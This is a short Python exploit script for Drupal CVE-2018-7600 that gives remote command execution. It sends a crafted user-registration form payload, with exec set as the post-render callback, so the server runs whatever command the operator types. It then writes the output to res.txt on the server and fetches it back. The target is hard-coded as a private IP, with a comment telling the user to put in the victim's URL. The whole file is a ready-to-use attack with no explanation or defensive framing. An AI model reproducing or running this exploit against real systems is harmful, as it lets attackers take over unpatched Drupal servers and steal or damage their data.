#!/usr/bin/python3
import sys
import requests

def exploit(target, command):
    proxies = {}
    verify = False

    payload = {
        'form_id': 'user_register_form',
        '_drupal_ajax': '1',
        'mail[#post_render][]': 'exec',
        'mail[#type]': 'markup',
        'mail[#markup]': command + ' | tee res.txt'
    }
    url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
    print('[*] Requesting post')
    r = requests.post(url, proxies=proxies, data=payload, verify=verify)
    
    try:
        scan = requests.get(target + '/res.txt')
        if scan.status_code != 200:
            print('Not vulnerable to CVE-2018-7600 exploit\n')
        if scan.status_code == 200:
            print('Vulnerable to CVE-2018-7600 exploit')
            print('URL: ' + target + '/res.txt\n')
            print('Command output:')
            print(scan.text)
    except requests.ConnectionError:
        print('Target connection timeout')
    except Exception as e:
        print('Connection Failed: ' + str(e))

if __name__ == '__main__':
    target = 'http://192.168.110.154/drupal' #replace by url of victim that running Drupal server
    command = input('Enter the command to execute: ')
    exploit(target, command)
